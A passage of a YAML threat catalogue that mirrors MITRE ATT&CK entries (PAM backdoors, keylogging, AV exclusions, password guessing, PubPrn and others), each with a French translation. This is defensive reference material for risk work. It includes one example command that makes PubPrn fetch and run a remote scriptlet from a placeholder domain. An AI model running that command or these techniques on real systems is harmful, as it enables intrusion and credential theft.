          \ format. (Citation : SentinelLabs inversant les scripts Apple-Only run-only\
          \ 2021) \n\nLe contenu int\xE9gr\xE9 peut \xE9galement \xEAtre utilis\xE9\
          \ comme charges utiles d'[injection de proc\xE9d\xE9](https://attack.mitre.org/techniques/T1055)\
          \ destin\xE9es \xE0 infecter des processus syst\xE8me b\xE9nins. (Citation\
          \ : Trend Micro) Ces charges utiles int\xE9gr\xE9es puis inject\xE9es peuvent\
          \ \xEAtre utilis\xE9es dans les modules de logiciels malveillants con\xE7\
          us pour fournir des fonctionnalit\xE9s sp\xE9cifiques telles que le chiffrement\
          \ des communications C2 en support d'un module orchestrator. Par exemple,\
          \ un module embarqu\xE9 peut \xEAtre inject\xE9 dans les navigateurs par\
          \ d\xE9faut, permettant aux adversaires de communiquer via le r\xE9seau.\
          \ (Citation : Rapport d'analyse de logiciels malveillants ComRAT) https://attack.mitre.org/techniques/T1027/009"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1556.003
    ref_id: T1556.003
    name: Pluggable Authentication Modules
    description: 'Adversaries may modify pluggable authentication modules (PAM) to
      access user credentials or enable otherwise unwarranted access to accounts.
      PAM is a modular system of configuration files, libraries, and executable files
      which guide authentication for many services. The most common authentication
      module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account
      authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation:
      Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)


      Adversaries may modify components of the PAM system to create backdoors. PAM
      components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary
      adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)


      Malicious modifications to the PAM system may also be abused to steal credentials.
      Adversaries may infect PAM resources with code to harvest user credentials,
      since the values exchanged with PAM components may be plain-text since PAM does
      not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)

      https://attack.mitre.org/techniques/T1556/003'
    translations:
      fr:
        name: "Modules d'authentification int\xE9grables"
        description: "Les adversaires peuvent modifier des modules d'authentification\
          \ pluggables (PAM) pour acc\xE9der aux identifiants utilisateur ou permettre\
          \ un acc\xE8s non justifi\xE9 aux comptes. PAM est un syst\xE8me modulaire\
          \ de fichiers de configuration, de biblioth\xE8ques et de fichiers ex\xE9\
          cutables qui guident l'authentification de nombreux services. Le module\
          \ d'authentification le plus courant est <code>pam_unix.so</code>, qui r\xE9\
          cup\xE8re, configure et v\xE9rifie les informations d'authentification des\
          \ comptes dans <code>/etc/passwd</code> et <code>/etc/shadow</code>. (Citation\
          \ : Apple PAM)(Citation : Homme Pam_Unix)(Citation : Red Hat PAM)\n\nLes\
          \ adversaires peuvent modifier des composants du syst\xE8me PAM pour cr\xE9\
          er des portes d\xE9rob\xE9es. Les composants PAM, tels que <code>pam_unix.so</code>,\
          \ peuvent \xEAtre corrig\xE9s pour accepter des valeurs fournies par l'adversaire\
          \ comme identifiants l\xE9gitimes. (Citation : PAM Backdoor)\n\nLes modifications\
          \ malveillantes du syst\xE8me PAM peuvent \xE9galement \xEAtre utilis\xE9\
          es pour voler des identifiants. Les adversaires peuvent infecter les ressources\
          \ PAM avec du code pour r\xE9colter les identifiants utilisateur, puisque\
          \ les valeurs \xE9chang\xE9es avec les composants PAM peuvent \xEAtre du\
          \ texte brut puisque le PAM ne stocke pas de mots de passe. (Citation :\
          \ PAM Creds)(Citation : Apple PAM) https://attack.mitre.org/techniques/T1556/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1578.004
    ref_id: T1578.004
    name: Revert Cloud Instance
    description: 'An adversary may revert changes made to a cloud instance after they
      have performed malicious activities in attempt to evade detection and remove
      evidence of their presence. In highly virtualized environments, such as cloud-based
      infrastructure, this may be accomplished by restoring virtual machine (VM) or
      data storage snapshots through the cloud management dashboard or cloud APIs.


      Another variation of this technique is to utilize temporary storage attached
      to the compute instance. Most cloud providers provide various types of storage
      including persistent, local, and/or ephemeral, with the ephemeral types often
      reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation:
      Google - Restore Cloud Snapshot)

      https://attack.mitre.org/techniques/T1578/004'
    translations:
      fr:
        name: Revert Cloud Instance
        description: "Un adversaire peut annuler les modifications apport\xE9es \xE0\
          \ une instance cloud apr\xE8s avoir effectu\xE9 des activit\xE9s malveillantes\
          \ dans le but d'\xE9chapper \xE0 la d\xE9tection et d'\xE9liminer les preuves\
          \ de sa pr\xE9sence. Dans des environnements hautement virtualis\xE9s, tels\
          \ que l'infrastructure bas\xE9e sur le cloud, cela peut \xEAtre r\xE9alis\xE9\
          \ en restaurant des instantan\xE9s de machines virtuelles (VM) ou de stockage\
          \ de donn\xE9es via le tableau de bord de gestion cloud ou les API cloud.\n\
          \nUne autre variante de cette technique consiste \xE0 utiliser un stockage\
          \ temporaire attach\xE9 \xE0 l'instance de calcul. La plupart des fournisseurs\
          \ cloud proposent divers types de stockage, y compris persistants, locaux\
          \ et/ou \xE9ph\xE9m\xE8res, les types \xE9ph\xE9m\xE8res \xE9tant souvent\
          \ r\xE9initialis\xE9s lors de l'arr\xEAt ou du red\xE9marrage de la VM.\
          \ (Citation : Tech Republic - Restaurez les instantan\xE9s AWS)(Citation\
          \ : Google - Restaurer l'instantan\xE9 du cloud) https://attack.mitre.org/techniques/T1578/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1592
    ref_id: T1592
    name: Gather Victim Host Information
    description: "Adversaries may gather information about the victim's hosts that\
      \ can be used during targeting. Information about hosts may include a variety\
      \ of details, including administrative data (ex: name, assigned IP, functionality,\
      \ etc.) as well as specifics regarding its configuration (ex: operating system,\
      \ language, etc.).\n\nAdversaries may gather this information in various ways,\
      \ such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595)\
      \ or [Phishing for Information](https://attack.mitre.org/techniques/T1598).\
      \ Adversaries may also compromise sites then include malicious content designed\
      \ to collect host information from visitors.(Citation: ATT ScanBox) Information\
      \ about hosts may also be exposed to adversaries via online or other accessible\
      \ data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001)\
      \ or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).\
      \ Gathering this information may reveal opportunities for other forms of reconnaissance\
      \ (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)\
      \ or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)),\
      \ establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)\
      \ or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or\
      \ initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195)\
      \ or [External Remote Services](https://attack.mitre.org/techniques/T1133)).\n\
      \nAdversaries may also gather victim host information via User-Agent HTTP headers,\
      \ which are sent to a server to identify the application, operating system,\
      \ vendor, and/or version of the requesting user agent. This can be used to inform\
      \ the adversary\u2019s follow-on action. For example, adversaries may check\
      \ user agents for the requesting operating system, then only serve malware for\
      \ target operating systems while ignoring others.(Citation: TrellixQakbot)\n\
      https://attack.mitre.org/techniques/T1592"
    translations:
      fr:
        name: "Recueillez les informations sur les h\xF4tes des victimes"
        description: "Les adversaires peuvent recueillir des informations sur les\
          \ h\xF4tes de la victime qui peuvent \xEAtre utilis\xE9es lors du ciblage.\
          \ Les informations sur les h\xF4tes peuvent inclure une vari\xE9t\xE9 de\
          \ d\xE9tails, notamment des donn\xE9es administratives (par exemple : nom,\
          \ IP attribu\xE9e, fonctionnalit\xE9s, etc.) ainsi que des d\xE9tails concernant\
          \ sa configuration (ex : syst\xE8me d'exploitation, langage, etc.).\n\n\
          Les adversaires peuvent recueillir ces informations de diff\xE9rentes mani\xE8\
          res, comme par des actions de collecte directe via [Scan Actif](https://attack.mitre.org/techniques/T1595)\
          \ ou [Phishing for Information](https://attack.mitre.org/techniques/T1598).\
          \ Les adversaires peuvent \xE9galement compromettre les sites et inclure\
          \ du contenu malveillant destin\xE9 \xE0 collecter des informations d'h\xE9\
          bergement aupr\xE8s des visiteurs. (Citation : ATT ScanBox) Les informations\
          \ sur les h\xE9bergeurs peuvent \xE9galement \xEAtre expos\xE9es aux adversaires\
          \ via des ensembles de donn\xE9es en ligne ou d'autres donn\xE9es accessibles\
          \ (ex : [R\xE9seaux sociaux](https://attack.mitre.org/techniques/T1593/001)\
          \ ou [Rechercher des sites web appartenant aux victimes](https://attack.mitre.org/techniques/T1594)).\
          \ La collecte de ces informations peut r\xE9v\xE9ler d'autres formes de\
          \ reconnaissance (ex : [Rechercher dans des sites web/domaines ouverts](https://attack.mitre.org/techniques/T1593)\
          \ ou [Rechercher dans des bases de donn\xE9es techniques ouvertes](https://attack.mitre.org/techniques/T1596)),\
          \ l'\xE9tablissement de ressources op\xE9rationnelles (ex. : [D\xE9velopper\
          \ des capacit\xE9s](https://attack.mitre.org/techniques/T1587) ou [Obtenir\
          \ des capacit\xE9s](https://attack.mitre.org/techniques/T1588)), et/ou un\
          \ acc\xE8s initial (ex : [Cha\xEEne d'approvisionnement Compromise](https://attack.mitre.org/techniques/T1195)\
          \ ou [Services externes \xE0 distance](https://attack.mitre.org/techniques/T1133)).\n\
          \nLes adversaires peuvent \xE9galement recueillir des informations sur l'h\xF4\
          te victime via des en-t\xEAtes HTTP User-Agent, qui sont envoy\xE9s \xE0\
          \ un serveur pour identifier l'application, le syst\xE8me d'exploitation,\
          \ le fournisseur et/ou la version de l'agent utilisateur demandeur. Cela\
          \ peut servir \xE0 informer l'action de suite de l'adversaire. Par exemple,\
          \ les adversaires peuvent v\xE9rifier les agents utilisateur pour le syst\xE8\
          me d'exploitation demandeur, puis ne servir que des logiciels malveillants\
          \ pour les syst\xE8mes cibles en ignorant les autres. (Citation : TrellixQakbot)\
          \ https://attack.mitre.org/techniques/T1592"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1596.003
    ref_id: T1596.003
    name: Digital Certificates
    description: 'Adversaries may search public digital certificate data for information
      about victims that can be used during targeting. Digital certificates are issued
      by a certificate authority (CA) in order to cryptographically verify the origin
      of signed content. These certificates, such as those used for encrypted web
      traffic (HTTPS SSL/TLS communications), contain information about the registered
      organization such as name and location.


      Adversaries may search digital certificate data to gather actionable information.
      Threat actors can use online resources and lookup tools to harvest information
      about certificates.(Citation: SSLShopper Lookup) Digital certificate data may
      also be available from artifacts signed by the organization (ex: certificates
      used from encrypted web traffic are served with content).(Citation: Medium SSL
      Cert) Information from these sources may reveal opportunities for other forms
      of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595)
      or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing
      operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)
      or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or
      initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)
      or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).

      https://attack.mitre.org/techniques/T1596/003'
    translations:
      fr:
        name: "Certificats num\xE9riques"
        description: "Les adversaires peuvent rechercher dans les donn\xE9es des certificats\
          \ num\xE9riques publics pour obtenir des informations sur les victimes pouvant\
          \ \xEAtre utilis\xE9es lors du ciblage. Les certificats num\xE9riques sont\
          \ d\xE9livr\xE9s par une autorit\xE9 de certification (AC) afin de v\xE9\
          rifier cryptographiquement l'origine du contenu sign\xE9. Ces certificats,\
          \ tels que ceux utilis\xE9s pour le trafic web chiffr\xE9 (communications\
          \ HTTPS SSL/TLS), contiennent des informations sur l'organisation enregistr\xE9\
          e telles que le nom et la localisation.\n\nLes adversaires peuvent rechercher\
          \ des donn\xE9es de certificats num\xE9riques pour recueillir des informations\
          \ exploitables. Les acteurs malveillants peuvent utiliser des ressources\
          \ en ligne et des outils de recherche pour collecter des informations sur\
          \ les certificats. (Citation : Recherche SSLShopper) Les donn\xE9es de certificats\
          \ num\xE9riques peuvent \xE9galement \xEAtre disponibles \xE0 partir d'artefacts\
          \ sign\xE9s par l'organisation (ex : les certificats utilis\xE9s \xE0 partir\
          \ de trafic web chiffr\xE9 sont servis avec du contenu). (Citation : Certificat\
          \ SSL moyen) Les informations provenant de ces sources peuvent r\xE9v\xE9\
          ler d'autres formes de reconnaissance (ex : [Analyse active](https://attack.mitre.org/techniques/T1595)\
          \ ou [Phishing pour obtenir des informations](https://attack.mitre.org/techniques/T1598)),\
          \ l'\xE9tablissement de ressources op\xE9rationnelles (ex. : [D\xE9velopper\
          \ des capacit\xE9s](https://attack.mitre.org/techniques/T1587) ou [Obtenir\
          \ des capacit\xE9s](https://attack.mitre.org/techniques/T1588)), et/ou un\
          \ acc\xE8s initial (ex : [T\xE9l\xE9commande externe Services](https://attack.mitre.org/techniques/T1133)\
          \ ou [Relation de Confiance](https://attack.mitre.org/techniques/T1199)).https\_\
          ://attack.mitre.org/techniques/T1596/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1056.001
    ref_id: T1056.001
    name: Keylogging
    description: 'Adversaries may log user keystrokes to intercept credentials as
      the user types them. Keylogging is likely to be used to acquire credentials
      for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)
      efforts are not effective, and may require an adversary to intercept keystrokes
      on a system for a substantial period of time before credentials can be successfully
      captured. In order to increase the likelihood of capturing credentials quickly,
      an adversary may also perform actions such as clearing browser cookies to force
      users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)


      Keylogging is the most prevalent type of input capture, with many different
      ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods
      include:


      * Hooking API callbacks used for processing keystrokes. Unlike [Credential API
      Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely
      on API functions intended for processing keystroke data.

      * Reading raw keystroke data from the hardware buffer.

      * Windows Registry modifications.

      * Custom drivers.

      * [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide
      adversaries with hooks into the operating system of network devices to read
      raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks)

      https://attack.mitre.org/techniques/T1056/001'
    translations:
      fr:
        name: Journal des touches
        description: "Les adversaires peuvent enregistrer les frappes de l'utilisateur\
          \ pour intercepter les identifiants au fur et \xE0 mesure que l'utilisateur\
          \ les tape. Le keylogging est susceptible d'\xEAtre utilis\xE9 pour acqu\xE9\
          rir des identifiants pour de nouvelles opportunit\xE9s d'acc\xE8s lorsque\
          \ les efforts de [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)\
          \ ne sont pas efficaces, et peuvent n\xE9cessiter qu'un adversaire intercepte\
          \ les frappes sur un syst\xE8me pendant une p\xE9riode importante avant\
          \ que les identifiants puissent \xEAtre captur\xE9s avec succ\xE8s. Afin\
          \ d'augmenter la probabilit\xE9 de capturer rapidement les identifiants,\
          \ un adversaire peut \xE9galement effectuer des actions telles que l'effacer\
          \ des cookies du navigateur pour forcer les utilisateurs \xE0 se r\xE9authentifier\
          \ sur les syst\xE8mes. (Citation : Talos Kimsuky nov. 2021)\n\nLe keylogging\
          \ est le type de capture d'entr\xE9e le plus r\xE9pandu, avec de nombreuses\
          \ fa\xE7ons diff\xE9rentes d'intercepter les frappes au clavier. (Citation\
          \ : Les aventures d'une frappe clavier) Quelques m\xE9thodes incluent :\n\
          \n* Hooking des callbacks API utilis\xE9s pour traiter les frappes au clavier.\
          \ Contrairement au [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004),\
          \ celui-ci se concentre uniquement sur les fonctions API destin\xE9es au\
          \ traitement des donn\xE9es de frappes de clavier.* Lecture des donn\xE9\
          es brutes de frappes de touche depuis le tampon mat\xE9riel.* Modifications\
          \ du registre Windows.* Les pilotes personnalis\xE9s.* [Modifier l'image\
          \ syst\xE8me](https://attack.mitre.org/techniques/T1601) peuvent fournir\
          \ aux adversaires des accroches au syst\xE8me d'exploitation des appareils\
          \ r\xE9seau pour lire les frappes brutes lors des sessions de connexion.\
          \ (Citation : Attaques de p\xE9riph\xE9riques h\xE9rit\xE9s du blog Cisco\
          \ https://attack.mitre.org/techniques/T1056/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.012
    ref_id: T1564.012
    name: File/Path Exclusions
    description: 'Adversaries may attempt to hide their file-based artifacts by writing
      them to specific folders or file names excluded from antivirus (AV) scanning
      and other defensive capabilities. AV and other file-based scanners often include
      exclusions to optimize performance as well as ease installation and legitimate
      use of applications. These exclusions may be contextual (e.g., scans are only
      initiated in response to specific triggering events/alerts), but are also often
      hardcoded strings referencing specific folders and/or files assumed to be trusted
      and legitimate.(Citation: Microsoft File Folder Exclusions)


      Adversaries may abuse these exclusions to hide their file-based artifacts. For
      example, rather than  tampering with tool settings to add a new exclusion (i.e.,
      [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)), adversaries
      may drop their file-based payloads in default or otherwise well-known exclusions.
      Adversaries may also use [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)
      and other [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043)
      activities to both discover and verify existing exclusions in a victim environment.

      https://attack.mitre.org/techniques/T1564/012'
    translations:
      fr:
        name: Exclusions de fichiers/chemins
        description: "Les adversaires peuvent tenter de dissimuler leurs artefacts\
          \ bas\xE9s sur des fichiers en les \xE9crivant dans des dossiers ou noms\
          \ de fichiers sp\xE9cifiques exclus de l'antivirus (AV) et d'autres capacit\xE9\
          s d\xE9fensives. Les scanners antivirus et autres bas\xE9s sur des fichiers\
          \ incluent souvent des exclusions pour optimiser les performances ainsi\
          \ que faciliter l'installation et l'utilisation l\xE9gitime des applications.\
          \ Ces exclusions peuvent \xEAtre contextuelles (par exemple, les scans ne\
          \ sont initi\xE9s qu'en r\xE9ponse \xE0 des \xE9v\xE9nements ou alertes\
          \ d\xE9clencheurs sp\xE9cifiques), mais sont aussi souvent des cha\xEEnes\
          \ cod\xE9es en dur faisant r\xE9f\xE9rence \xE0 des dossiers et/ou fichiers\
          \ sp\xE9cifiques suppos\xE9s fiables et l\xE9gitimes. (Citation : Exclusions\
          \ des dossiers Microsoft)\n\nLes adversaires peuvent abuser de ces exclusions\
          \ pour masquer leurs artefacts bas\xE9s sur des fichiers. Par exemple, plut\xF4\
          t que de modifier les param\xE8tres de l'outil pour ajouter une nouvelle\
          \ exclusion (c'est-\xE0-dire [D\xE9sactiver ou modifier les outils](https://attack.mitre.org/techniques/T1562/001)),\
          \ les adversaires peuvent supprimer leurs charges utiles bas\xE9es sur des\
          \ fichiers dans des exclusions par d\xE9faut ou autrement bien connues.\
          \ Les adversaires peuvent \xE9galement utiliser [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)\
          \ et d'autres activit\xE9s [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043)\
          \ pour \xE0 la fois d\xE9couvrir et v\xE9rifier les exclusions existantes\
          \ dans un environnement victime.https\_://attack.mitre.org/techniques/T1564/012"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1222.002
    ref_id: T1222.002
    name: Linux and Mac File and Directory Permissions Modification
    description: "Adversaries may modify file or directory permissions/attributes\
      \ to evade access control lists (ACLs) and access protected files.(Citation:\
      \ Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018)\
      \ File and directory permissions are commonly managed by ACLs configured by\
      \ the file or directory owner, or users with the appropriate permissions. File\
      \ and directory ACL implementations vary by platform, but generally explicitly\
      \ designate which users or groups can perform which actions (read, write, execute,\
      \ etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission\
      \ groups (user, group, and other) and a standard set of permissions (read, write,\
      \ and execute) that are applied to each group. While nuances of each platform\u2019\
      s permissions implementation may vary, most of the platforms provide two primary\
      \ commands used to manipulate file and directory ACLs: <code>chown</code> (short\
      \ for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial\
      \ may use these commands to make themselves the owner of files and directories\
      \ or change the mode if current permissions allow it. They could subsequently\
      \ lock others out of the file. Specific file and directory modifications may\
      \ be a required step for many techniques, such as establishing Persistence via\
      \ [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004)\
      \ or tainting/hijacking other instrumental binary/configuration files via [Hijack\
      \ Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS\
      \ Common Tools and Techniques)\nhttps://attack.mitre.org/techniques/T1222/002"
    translations:
      fr:
        name: "Modification des permissions de fichiers et de r\xE9pertoires Linux\
          \ et Mac"
        description: "Les adversaires peuvent modifier les permissions/attributs des\
          \ fichiers ou des r\xE9pertoires pour contourner les listes de contr\xF4\
          le d'acc\xE8s (ACL) et acc\xE9der \xE0 des fichiers prot\xE9g\xE9s. (Citation\
          \ : Analyse hybride Icacls 1er juin 2018)(Citation : Analyse hybride Icacls2\
          \ mai 2018) Les permissions de fichiers et de r\xE9pertoires sont g\xE9\
          n\xE9ralement g\xE9r\xE9es par des ACL configur\xE9es par le propri\xE9\
          taire du fichier ou du r\xE9pertoire, ou par des utilisateurs disposant\
          \ des autorisations appropri\xE9es. Les impl\xE9mentations des ACL de fichiers\
          \ et de r\xE9pertoires varient selon la plateforme, mais d\xE9signent g\xE9\
          n\xE9ralement explicitement quels utilisateurs ou groupes peuvent effectuer\
          \ quelles actions (lecture, \xE9criture, ex\xE9cution, etc.).\n\nLa plupart\
          \ des plateformes Linux et bas\xE9es sur Linux fournissent un ensemble standard\
          \ de groupes de permissions (utilisateur, groupe et autres) ainsi qu'un\
          \ ensemble standard de permissions (lire, \xE9crire et ex\xE9cuter) qui\
          \ sont appliqu\xE9es \xE0 chaque groupe. Bien que les nuances de l'impl\xE9\
          mentation des permissions de chaque plateforme puissent varier, la plupart\
          \ des plateformes fournissent deux commandes principales utilis\xE9es pour\
          \ manipuler les ACL de fichiers et de r\xE9pertoires : <code>chown</code>\
          \ (diminutif de propri\xE9taire du changement), et <code>chmod</code> (diminutivation\
          \ de mode change).\n\nLes adversaires peuvent utiliser ces commandes pour\
          \ se faire propri\xE9taire de fichiers et de r\xE9pertoires ou changer de\
          \ mode si les permissions actuelles le permettent. Ils pourraient ensuite\
          \ bloquer d'autres personnes hors du dossier. Des modifications sp\xE9cifiques\
          \ de fichiers et de r\xE9pertoires peuvent \xEAtre une \xE9tape n\xE9cessaire\
          \ pour de nombreuses techniques, telles que l'\xE9tablissement de la persistance\
          \ via [Modification de configuration du shell Unix](https://attack.mitre.org/techniques/T1546/004)\
          \ ou la contamination/d\xE9tournement d'autres fichiers binaires/de configuration\
          \ instrumentaux via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\
          \ (Citation : 20 outils et techniques courants sur macOS)https://attack.mitre.org/techniques/T1222/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1110.001
    ref_id: T1110.001
    name: Password Guessing
    description: 'Adversaries with no prior knowledge of legitimate credentials within
      the system or environment may guess passwords to attempt access to accounts.
      Without knowledge of the password for an account, an adversary may opt to systematically
      guess the password using a repetitive or iterative mechanism. An adversary may
      guess login credentials without prior knowledge of system or environment passwords
      during an operation by using a list of common passwords. Password guessing may
      or may not take into account the target''s policies on password complexity or
      use policies that may lock accounts out after a number of failed attempts.


      Guessing passwords can be a risky option because it could cause numerous authentication
      failures and account lockouts, depending on the organization''s login failure
      policies. (Citation: Cylance Cleaver)


      Typically, management services over commonly used ports are used when guessing
      passwords. Commonly targeted services include the following:


      * SSH (22/TCP)

      * Telnet (23/TCP)

      * FTP (21/TCP)

      * NetBIOS / SMB / Samba (139/TCP & 445/TCP)

      * LDAP (389/TCP)

      * Kerberos (88/TCP)

      * RDP / Terminal Services (3389/TCP)

      * HTTP/HTTP Management Services (80/TCP & 443/TCP)

      * MSSQL (1433/TCP)

      * Oracle (1521/TCP)

      * MySQL (3306/TCP)

      * VNC (5900/TCP)

      * SNMP (161/UDP and 162/TCP/UDP)


      In addition to management services, adversaries may "target single sign-on (SSO)
      and cloud-based applications utilizing federated authentication protocols,"
      as well as externally facing email applications, such as Office 365.(Citation:
      US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces
      (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication
      protocols.(Citation: Trend Micro Emotet 2020)


      In default environments, LDAP and Kerberos connection attempts are less likely
      to trigger events over SMB, which creates Windows "logon failure" event ID 4625.

      https://attack.mitre.org/techniques/T1110/001'
    translations:
      fr:
        name: Deviner les mots de passe
        description: "Les adversaires sans connaissance pr\xE9alable des identifiants\
          \ l\xE9gitimes dans le syst\xE8me ou l'environnement peuvent deviner les\
          \ mots de passe pour tenter d'acc\xE9der aux comptes. Sans connaissance\
          \ du mot de passe d'un compte, un adversaire peut choisir de deviner syst\xE9\
          matiquement le mot de passe \xE0 l'aide d'un m\xE9canisme r\xE9p\xE9titif\
          \ ou it\xE9ratif. Un adversaire peut deviner des identifiants de connexion\
          \ sans connaissance pr\xE9alable des mots de passe syst\xE8me ou d'environnement\
          \ lors d'une op\xE9ration en utilisant une liste de mots de passe courants.\
          \ La devinette de mot de passe peut ou non prendre en compte les politiques\
          \ de complexit\xE9 des mots de passe de la cible ou utiliser des politiques\
          \ qui peuvent bloquer les comptes apr\xE8s plusieurs tentatives infructueuses.\n\
          \nDeviner les mots de passe peut \xEAtre une option risqu\xE9e car cela\
          \ peut entra\xEEner de nombreuses erreurs d'authentification et des blocages\
          \ de compte, selon les politiques de d\xE9faillance de connexion de l'organisation.\
          \ (Citation : Cylance Cleaver)\n\nEn g\xE9n\xE9ral, les services de gestion\
          \ sur les ports couramment utilis\xE9s sont utilis\xE9s pour deviner des\
          \ mots de passe. Les services couramment cibl\xE9s incluent les suivants\
          \ :\n\n* SSH (22/TCP)* Telnet (23/TCP)* FTP (21/TCP)* NetBIOS / SMB / Samba\
          \ (139/TCP & 445/TCP)* LDAP (389/TCP)* Kerberos (88/TCP)* RDP / Services\
          \ terminaux (3389/TCP)* http/http Services de gestion (80/TCP & 443/TCP)*\
          \ MSSQL (1433/TCP)* Oracle (1521/TCP)* MySQL (3306/TCP)* VNC (5900/TCP)*\
          \ SNMP (161/UDP et 162/TCP/UDP)\n\nEn plus des services de gestion, les\
          \ adversaires peuvent \xAB cibler des applications d'authentification unique\
          \ (SSO) et cloud utilisant des protocoles d'authentification f\xE9d\xE9\
          r\xE9e \xBB, ainsi que des applications de messagerie externes, telles qu'Office\
          \ 365. (Citation : US-CERT TA18-068A 2018). De plus, les adversaires peuvent\
          \ abuser des interfaces de dispositifs r\xE9seau (comme \xAB wlanAPI \xBB\
          ) pour forcer l'acc\xE8s ou les routeurs wifi via des protocoles d'authentification\
          \ sans fil. (Citation : Trend Micro Emotet 2020)\n\nDans les environnements\
          \ par d\xE9faut, les tentatives de connexion LDAP et Kerberos sont moins\
          \ susceptibles de d\xE9clencher des \xE9v\xE9nements via SMB, ce qui cr\xE9\
          e l'ID d'\xE9v\xE9nement \xAB \xE9chec de connexion \xBB de Windows 4625.https\_\
          ://attack.mitre.org/techniques/T1110/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1216.001
    ref_id: T1216.001
    name: PubPrn
    description: 'Adversaries may use PubPrn to proxy execution of malicious remote
      files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005)
      script that publishes a printer to Active Directory Domain Services. The script
      may be signed by Microsoft and is commonly executed through the [Windows Command
      Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>.
      For example, the following code publishes a printer within the specified domain:
      <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation:
      pubprn)


      Adversaries may abuse PubPrn to execute malicious payloads hosted on remote
      sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the
      second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted
      on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>.
      This behavior may bypass signature validation restrictions and application control
      solutions that do not account for abuse of this script.


      In later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated
      to prevent proxying execution from a remote site. This is done by limiting the
      protocol specified in the second parameter to <code>LDAP://</code>, vice the
      <code>script:</code> moniker which could be used to reference remote code via
      HTTP(S).

      https://attack.mitre.org/techniques/T1216/001'
    translations:
      fr:
        name: PubPrn
        description: "Les adversaires peuvent utiliser PubPrn pour proxy l'ex\xE9\
          cution de fichiers distants malveillants. PubPrn.vbs est un script [Visual\
          \ Basic](https://attack.mitre.org/techniques/T1059/005) qui publie une imprimante\
          \ vers Active Directory Domain Services. Le script peut \xEAtre sign\xE9\
          \ par Microsoft et est couramment ex\xE9cut\xE9 via le [Windows Command\
          \ Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>.\
          \ Par exemple, le code suivant publie une imprimante dans le domaine sp\xE9\
          cifi\xE9 : <code>cscript pubprn Printer1 LDAP\_://CN=Container1,DC=Domain1,DC=Com</code>.\
          \ (Citation : pubprn)\n\nLes adversaires peuvent abuser de PubPrn pour ex\xE9\
          cuter des charges utiles malveillantes h\xE9berg\xE9es sur des sites distants.\
          \ (Citation : Enigma0x3 PubPrn Bypass) Pour ce faire, les adversaires peuvent\
          \ d\xE9finir le second param\xE8tre <code>script\_:</code> pour r\xE9f\xE9\
          rencer un fichier scriptlet (.sct) h\xE9berg\xE9 sur un site distant. Un\
          \ exemple de commande est <code>pubprn.vbs 127.0.0.1 script : https\_://mydomain.com/folder/file.sct</code>.\
          \ Ce comportement peut contourner les restrictions de validation des signatures\
          \ et les solutions de contr\xF4le d'application qui ne prennent pas en compte\
          \ les abus de ce script.\n\nDans les versions ult\xE9rieures de Windows\
          \ (10+), <code>PubPrn.vbs</code> a \xE9t\xE9 mis \xE0 jour pour emp\xEA\
          cher l'ex\xE9cution par proxy depuis un site distant. Cela se fait en limitant\
